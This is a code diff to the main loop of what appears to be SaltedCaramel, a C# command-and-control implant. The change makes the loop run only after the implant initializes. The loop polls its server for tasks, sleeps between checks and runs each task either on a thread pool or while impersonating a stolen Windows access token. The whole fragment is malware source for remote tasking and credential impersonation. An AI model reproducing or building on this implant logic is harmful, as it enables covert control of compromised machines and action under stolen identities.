@@ -30,23 +30,24 @@ namespace SaltedCaramel
             implant.user = Environment.UserName;
             HTTP.crypto.PSK = Convert.FromBase64String(args[1]);
 
-            implant.InitializeImplant();
-
-            while (true)
+            if (implant.InitializeImplant())
             {
-                SCTaskObject task = implant.CheckTasking();
-                if (task.command != "none")
+                while (true)
                 {
-                    if (implant.HasAlternateToken() == true)
+                    SCTaskObject task = implant.CheckTasking();
+                    if (task.command != "none")
                     {
-                        using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
-                        using (WindowsImpersonationContext context = ident.Impersonate())
-                            task.DispatchTask(implant);
+                        if (implant.HasAlternateToken() == true)
+                        {
+                            using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
+                            using (WindowsImpersonationContext context = ident.Impersonate())
+                                task.DispatchTask(implant);
+                        }
+                        else
+                            ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                     }
-                    else
-                        ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
+                    Thread.Sleep(implant.sleep);
                 }
-                Thread.Sleep(implant.sleep);
             }
         }
     }
